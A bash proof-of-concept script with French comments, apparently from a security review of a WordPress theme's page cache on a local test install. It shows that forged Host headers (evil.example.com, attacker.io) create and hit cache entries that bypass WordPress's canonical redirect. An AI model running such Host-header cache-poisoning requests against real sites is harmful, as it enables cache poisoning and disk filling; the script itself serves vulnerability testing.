#!/usr/bin/env bash
# PoC: la cle de cache est derivee de l'en-tete Host (non verifie).
# But: montrer qu'une requete avec un Host etranger ecrit et se voit servir un
# HIT, court-circuitant la redirection canonique de WordPress.
set -uo pipefail
W=/opt/pk/wp; C=$W/wp-content/uploads/partikulier-cache
L=$W/wp-content/themes/partikulier/inc/class-cache.php
S=${SLUG:-appartement-t2-vue-mer-avec-balcon}

echo "### 0. environnement"
printf '  theme installe : %s | version : %s\n' "$(basename $(dirname $L))" "$(grep -m1 'Version:' $W/wp-content/themes/partikulier/style.css | tr -d ' ')"
printf '  ligne du garde (v6.17.8 = sans trim) : %s\n' "$(sed -n "$(grep -n 'is_admin_bar_showing' $L | head -1 | cut -d: -f1)p" $L | tr -d '\t')"
printf '  siteurl = %s\n' "$(WP_CLI_ALLOW_ROOT=1 wp --path=$W option get siteurl --allow-root 2>/dev/null | tail -1)"

hit(){ # $1 host-header value  $2 path
  local h=$1 p=$2 code sz hc
  code=$(curl -s -o /dev/null -w '%{http_code}/%{size_download}' -D /tmp/hh -H "Host: $h" -H "Cookie: pll_language=fr" --max-time 40 "http://127.0.0.1:8090$p")
  hc=$(tr -d '\r' < /tmp/hh | grep -io 'x-partikulier-cache: [A-Z]*' | cut -d' ' -f2)
  loc=$(tr -d '\r' < /tmp/hh | grep -i '^location:' | cut -d' ' -f2)
  printf '     Host=%-22s %-16s -> %s [%s] %s\n' "$h" "$p" "$code" "${hc:-sans-en-tete}" "${loc:+loc=$loc}"
}

echo; echo "### 1. cycle de chauffe sur le bon Host (le cache doit se remplir)"
rm -rf "$C"/* 2>/dev/null; sleep .3
hit "localhost:8090" "/annonces/"   # 1re visite: Set-Cookie -> pas de cache
hit "localhost:8090" "/annonces/"
hit "localhost:8090" "/annonces/"
printf '  fichiers: %s\n' "$(find "$C" -maxdepth 1 -name '*.html' -printf '%so %f\n' 2>/dev/null | sed 's/^/     /')"

echo; echo "### 2. requete avec un Host ETRANGER (ce que ferait un scanneur / un Host arbitraire)"
hit "evil.example.com" "/annonces/"
hit "evil.example.com" "/annonces/"
hit "evil-example-com" "/annonces/"
printf '  fichiers apres ces 3 requetes : %s\n' "$(find "$C" -maxdepth 1 -name '*.html' -printf '%so %f\n' 2>/dev/null | sed 's/^/     /')"

echo; echo "### 3. le Host etranger obtient-il un HIT (donc la reponse est servie sans passer par WP) ?"
for h in evil.example.com evil-example-com attacker.io; do hit "$h" "/annonces/"; done

echo; echo "### 4. consequences"
printf '  a) nombre de fichiers crees par Host distinct : %s\n' "$(find "$C" -maxdepth 1 -name '*.html' | wc -l)"
printf '  b) le meme contenu est duplique (donc un attaquant qui connait une cle peut ecrire ce fichier) : \n'
md5sum "$C"/*.html 2>/dev/null | awk '{print "     ",$1,$2}' | head -6
printf '  c) ecritures totales apres 12 requetes : %s fichiers pour 1 seule URL legitime\n' "$(find "$C" -maxdepth 1 -name '*.html' | wc -l)"
echo; echo "### 5. est-ce que le cache est ecrit AVANT controle du statut (le point de design) ?"
printf '  ligne de garde: %s\n' "$(sed -n "$(grep -n 'is_admin_bar_showing' $L | head -1 | cut -d: -f1)p" $L | tr -d '\t')"
printf '  -> un 301 (statut 301, pas >=400) et un corps vide passent ; seul trim() arrete sur 9b23729\n'
